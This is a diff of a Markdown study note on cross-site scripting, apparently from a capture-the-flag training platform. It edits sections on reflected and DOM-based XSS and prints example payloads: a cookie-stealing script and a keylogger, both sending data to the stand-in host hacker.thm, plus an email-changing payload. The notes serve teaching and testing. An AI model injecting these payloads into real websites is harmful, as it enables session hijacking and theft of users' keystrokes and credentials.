@@ -1,6 +1,6 @@
 # Cross-Site Scripting
 
-In XSS, the payload in the JavaScript Script we wqnt to run on the target's machine.
+In XSS, the payload is the JavaScript Script we want to run on the target's machine.
 There are two parts in a payload: the Intention and the Modification.
 The intention is what we wish the JavaScript to do. The Modification is the changes to the code we need to make in order to exploit the vulnerability.
 
@@ -14,17 +14,23 @@ The fastest way is to create a JavaScript alert with this payload : `<script> al
 ### Session Stealing
 
 There are lots of information in cookies on the target's machine. The goal is to have these cookies to take over the target's session and be logged as the user.
-To do so, we can use this payload : `<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>`
+To do so, we can use this payload :
+
+`<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>`.
+
 The JavaScript takes the target's cookie, base64 encodes the cookie to ensure successful transmission and then posts it to a website under the hacker's control to be logged.
 
 ### Key logger
 
 With the key logger, anything typed on the webpage will be forwarded to a website under the hacker's control. It can be very damaging if credit card details or private information is stored on the web application's database.
-Here is an example : `<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>`
+Here is an example : 
+
+`<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>`
 
 ### Business logic
 
 The next payload is about calling a particular network resource or JavaScript function. For example, imagine a JavaScript function for changing the user's email address called user.changeEmail(). Your payload could look like this:
+
 `<script>user.changeEmail('attacker@hacker.thm');</script>`
 
 ## Reflected XSS
@@ -39,7 +45,7 @@ We can test it by testing every possible point of entry where it seems data is s
 
 ## DOM-Based XSS
 
-DOM stands for Document Object Model and is a programming interface in HTML and XML documents. It represnets the page so that programs can change the document's structure, style and content.
+DOM stands for Document Object Model and is a programming interface in HTML and XML documents. It represents the page so that programs can change the document's structure, style and content.
 DOM-based XSS is where the JavaScript execution happens directly in the browser without any new pages being loaded or data submitted to backend code.
 The execution occurs when the website's JavaScript code acts as input or user interaction.
 To test it, it requires a certain amount of knowledge in JavaScript to read the source code. We need to look for parts of code that access certain variables that an attacker can have control over such as "window.location.X" parameters. We can then see how they're handled.
